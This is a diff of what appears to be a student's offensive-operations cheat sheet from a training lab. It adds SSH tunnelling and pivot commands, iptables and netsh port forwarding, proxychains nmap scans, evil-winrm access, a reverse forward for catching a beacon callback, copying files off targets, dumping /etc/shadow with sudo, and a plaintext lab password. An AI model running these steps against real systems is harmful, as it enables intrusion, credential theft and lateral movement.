@@ -2,10 +2,59 @@
 
 ssh -MS /tmp/<T> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <user>@<ip>
 ssh -S /tmp/<T> -O forward -L 127.0.0.1:<RHP>:<IP>:<SSHPORT> dummy
+ssh -S /tmp/T3 -O forward -L 127.0.0.1:2004:192.168.0.9:22 dummy
+ssh -MS /tmp/T4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -p 2004
 
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.38.103
+
+student14
+password14
+
+***COLLECTION***
+scp -r -o ControlPath=/tmp/T4 -P 2004 student14@127.0.0.1:"C:/Program Files/Common Files/system/ado/*.dll" .
+scp -o ControlPath=/tmp/T3 -P 2003 student14@127.0.0.1:"/etc/" .
+Download Privileged File:
+ssh -S /tmp/T3 dummy "sudo -S cat /etc/shadow" > shadow
+
+***POST OP***
+tar -cvf <studentdir>.tar <studentdir>
+scp <studentdir>.tar student14@10.50.29.204:~
+password14
+
+***SCANNING***
+arp
+ip n
+ip n | cut -d' ' -f1
+ip n | grep -v FAILED | cut -d' ' -f1
+ssh -S /tmp/T# dummy -O forward -D 9050
+proxychains -q nmap -n -Pn -v -sT -T3 -p 21,22,23,80,443,111,67,53,135,445,3389,5985,5986 <IPs>
+proxychains nmap -n -Pn -v -sV -sT -T3 -p <SpecificPorts> <SpecificIPs>
+
+***IPTables***
+sudo iptables -L -t nat -n
+iptables -t nat -A PREROUTING -p tcp --dport <RandomHighPORT> -j DNAT --to-destination <NextTargetIP>:<SSHPort>
+sudo iptables -L -t nat -n
+sudo sysctl net.ipv4.ip_forward
+sudo sysctl -w net.ipv4.ip_forward=1
+Delete rules:
+sudo iptables -t nat -D PREROUTING -p tcp --dport 2222 -j DNAT --to-destination T2IP:22
+
+***NETSH***
+netsh interface portproxy show all
+netsh interface portproxy add v4tov4 listenport=<PortforCurrentTargetBox> listenaddress=<CurrentTargetIP> connectport=<NextTargetSSHPort> connectaddress=<NextTargetIP> protocol=tcp
+Delete Rule:
+netsh interface portproxy delete v4tov4 listenport=<PortforCurrentTargetBox> listenaddress=<CurrentTargetIP>
+
+***WINDOWS FILE HASHING***
+certutil -hashfile <FilePath> MD5
+for %F in (*) do @certutil -hashfile "%F" MD5 | findstr -v "CertUtil: -hashfile command completed successfully.”
+powershell -Command "Get-ChildItem -Path '<FilePath>' -File -Recurse | ForEach-Object { Get-FileHash -Path $_.FullName -Algorithm MD5 }"
 
 ***LINUX VETTING***
 
+ip a
+ifconfig -a
+ifconfig -a OR ip a
 w
 who -Ha
 date; date -u
@@ -18,8 +67,8 @@ ls -latr ..
 sudo ls -latr /root
 
 ps -elfH
-ifconfig -a OR ip a
-sudo netstat -auntp OR sudo ss -auntp
+sudo netstat -auntp
+sudo ss -auntp
 
 sudo ls -latr /var/spool/cron
 tail -n 1000 <files in /var.spool/cron/>
@@ -29,27 +78,43 @@ ls -latr /var/*/*acc*
 ls -latr /var/*log*/
 sudo ls -latr /var/log/*
 ls -la /etc/*syslog*
+less /etc/rsyslog.conf
+less /etc/rsyslog.d/*.conf
+less /etc/hosts
+
 
 for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is :"; cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
 cat /etc/crontab
 ls -la /etc/cron.*
 
-sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<duration in minutes since initial connection> -type f -print0 | xargs -0 sudo ls -latr
+sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -10 -type f -print0 | xargs -0 sudo ls -latr
 
 sestatus OR getenforce
+sudo tail -n 5 /var/log/audit/audit.log
 
 sudo cat /root/.bash_history
 cat ~/.bash_history
 
+***MALWARE PROSECUTION***
+lsof -Pnp <PID> 
+(shows all open file handles of that process)
+ls -la /proc/<PID>
+insmod OR modprobe
+
+***IDENTIFY PRIVILEGE USERS***
+cat /etc/sudoers
+cat /etc/group
+groups <username>
 
 ***BEFORE DISCONNECT***
 w
 who -Ha
 ls -latr /tmp
-ps -elf
-sudo netstat -lptn OR sudo ss -lptn
+ps -elfH
+sudo netstat -lptn
+sudo ss -lptn
 ls -latr /var/log
-sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<yourminutesontarget> -type f -print0 | xargs -0 sudo ls -latr
+sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -300 -type f -print0 | xargs -0 sudo ls -latr
 exit
 
 ***LINUX SURVEY COMMANDS***
@@ -59,7 +124,8 @@ uname -a
 ls -latr /etc/*release*
 cat /etc/*release*
 cat /proc/cpuinfo
-services --status-all || systemctl status --no-pager (depending on systemd vs not systemd)
+services --status-all || systemctl status --no-pager 
+(depending on systemd vs not systemd)
 cat /proc/meminfo
 sudo cat /etc/shadow
 cat /etc/passwd
@@ -69,17 +135,21 @@ lsusb
 lsblk
 sudo fdisk -l
 free -m
-dmidecode -t bios
+sudo dmidecode -t bios
+
+***CATCH CALLBACK***
+Catch the callback beacon from T4
+ssh -S /tmp/T3 dummy -O forward -R <T4 IP>:<BeaconPort>:127.0.0.1:<RHP>
 
 /////////////////////////////////////////////////////////////////////////
 
 ***WINDOWS VETTING***
+ipconfig /all
 date /t && time /t
 query user
 tasklist /V
 wmic process get processid,parentprocessid,executablepath
 auditpol /get /category:*
-ipconfig /all
 netstat /anob
 netsh advfirewall show allprofiles
 net share
@@ -87,21 +157,26 @@ reg query hklm\software\microsoft\windows\currentversion\run
 reg query hklm\software\microsoft\windows\currentversion\runonce
 reg query hklm\software
 schtasks /query /v
+schtasks /query
+schtasks /query /fo LIST /v
 dir /o:d /t:w c:\
 dir /o:d /t:w c:\windows\temp
 dir /o:d /t:w c:\windows\
 dir /o:d /t:w c:\windows\system32
 dir /o:d /t:w c:\windows\system32\winevt\logs
 dir /o:d /t:w "%appdata%\microsoft\windows\start menu\programs\startup"
-wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+wevtutil qe security /c:25 /rd:false /f:text 
+(whatever has updated from previous dir)
 
 ***BEFORE DISCONNECT***
 dir /o:d /t:w c:\windows\temp
 dir /o:d /t:w c:\windows\system32\winevt\logs
-wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+wevtutil qe security /c:25 /rd:true /f:text 
+(whatever has updated from previous dir)
 netstat /anob
 query user
 tasklist /V
+exit
 
 ***WINDOWS SURVEY COMMANDS***
 systeminfo
@@ -124,10 +199,19 @@ wmic service list full
 wmic product get Caption, InstallDate, Vendor
 wmic useraccount where "LocalAccount='TRUE'" get Caption, Disabled, Domain, Lockout, PasswordExpires, SID, Status
 
+***WINDOWS FILE HASHING***
+certutil -hashfile <FilePath> MD5
+for %F in (*) do @certutil -hashfile "%F" MD5 | findstr -v "CertUtil: -hashfile command completed successfully.”
+powershell -Command "Get-ChildItem -Path '<FilePath>' -File -Recurse | ForEach-Object { Get-FileHash -Path $_.FullName -Algorithm MD5 }"
+
+***EVIL WINRM***
+evil-winrm -i <TUNNEL_IP> -u <USERNAME> -P <TUNNEL_PORT>
 
 ***POWERSHELL VETTING***
+ipconfig /all
 Get-Date
 query-user
+net user Administrator
 tasklist /V
 wmic process get processid,parentprocessid,executablepath
 auditpol /get /category:*
